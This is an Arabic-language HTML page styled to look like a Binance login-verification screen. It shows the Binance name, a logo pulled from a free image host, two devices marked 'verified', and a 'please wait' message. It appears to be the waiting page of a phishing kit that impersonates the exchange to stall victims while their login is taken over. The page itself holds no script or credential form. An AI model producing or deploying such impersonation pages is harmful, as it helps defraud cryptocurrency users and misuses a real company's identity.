<!DOCTYPE html><html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>صفحة تسجيل الدخول</title>
  <!-- استيراد خط Google Roboto -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    /* إعادة تعيين الأنماط الافتراضية */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Roboto', sans-serif;
      background: #121212;
      color: #fff;
      min-height: 100vh;
    }
    header {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      padding: 10px 20px;
      background-color: #121212;
      display: flex;
      align-items: center;
      z-index: 1000;
      border-bottom: 1px solid #333;
    }
    header img {
      height: 40px;
      margin-right: 10px;
    }
    header h2 {
      color: #F0B90B;
      font-size: 1.5rem;
      margin: 0;
    }
    .container {
      background: linear-gradient(135deg, #121212, #1F1F1F);
      padding: 40px 30px;
      border-radius: 10px;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
      text-align: center;
      max-width: 400px;
      width: 90%;
      margin: 100px auto 0 auto;
    }
    .logo {
      width: 96px;
      height: auto;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 1.8rem;
      margin-bottom: 10px;
    }
    p.subtitle {
      font-size: 1.2rem;
      margin-bottom: 20px;
    }
    .device-section {
      display: flex;
      align-items: center;
      justify-content: flex-start;
      margin: 20px 0;
      padding: 10px;
      border: 1px solid #333;
      border-radius: 5px;
    }
    .device-icon {
      width: 64px;
      height: 64px;
      margin-right: 15px;
    }
    .device-info {
      text-align: left;
      flex: 1;
    }
    .device-info h2 {
      font-size: 1.4rem;
      margin-bottom: 5px;
      display: flex;
      align-items: center;
    }
    .check-mark {
      font-size: 1.2rem;
      color: #28a745;
      margin-left: 8px;
    }
    .verified {
      font-size: 1rem;
      color: #28a745;
      margin-top: 5px;
    }
    .waiting {
      font-size: 1.4rem;
      color: #F0B90B;
      margin-top: 25px;
      text-align: center;
    }
  </style>
</head>
<body>
  <header>
    <img src="https://j.top4top.io/p_3388vj7m41.png" alt="Binance Logo">
    <h2>BINANCE</h2>
  </header>  <div class="container">
    <img class="logo" src="https://img.icons8.com/fluency/96/000000/lock.png" alt="Lock Logo">
    <h1>يجب اتمام عمليه تسجيل الدخول</h1>
    <p class="subtitle">لمدة 30 يوما</p><div class="device-section">
  <img class="device-icon" src="https://img.icons8.com/fluency/96/000000/monitor.png" alt="Computer Icon">
  <div class="device-info">
    <h2>Windows <span class="check-mark">&#10004;</span></h2>
    <div class="verified">تم التأكد منه</div>
  </div>
</div>

<div class="device-section">
  <img class="device-icon" src="https://img.icons8.com/fluency/96/000000/smartphone.png" alt="Phone Icon">
  <div class="device-info">
    <h2>Galaxy S8+ <span class="check-mark">&#10004;</span></h2>
    <div class="verified">تم التأكد منه</div>
  </div>
</div>

<div class="waiting">نرجو منك الانتظار</div>

  </div>
</body>
</html>
